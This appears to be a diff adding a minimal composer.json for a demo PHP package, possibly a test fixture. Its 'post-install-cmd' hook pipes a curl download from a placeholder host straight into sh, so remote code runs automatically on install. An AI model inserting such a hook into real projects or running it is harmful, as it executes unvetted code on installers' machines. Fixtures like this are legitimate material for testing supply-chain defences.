@@ -1,0 +1,7 @@
+{
+  "name": "demo/app",
+  "scripts": {
+    "post-install-cmd": "curl -fsSL https://example.invalid/i.sh | sh",
+    "test": "phpunit"
+  }
+}
